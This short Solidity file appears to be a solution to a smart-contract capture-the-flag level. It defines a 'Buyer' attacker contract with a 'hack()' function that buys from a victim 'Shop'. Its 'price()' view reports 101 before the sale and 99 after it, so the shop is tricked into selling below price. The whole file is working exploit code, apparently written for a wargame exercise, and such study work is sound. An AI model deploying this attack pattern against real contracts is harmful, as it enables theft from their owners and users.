// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}



contract Buyer {
    Shop victim;
    constructor(address payable _addr) public {
        victim = Shop(_addr);
    }
    
    function price() public view returns (uint){
        if (victim.isSold()){
            return 99;
        }
        else{
            return 101;
        }      
  }

  function hack() public {
      victim.buy();  
    }
}

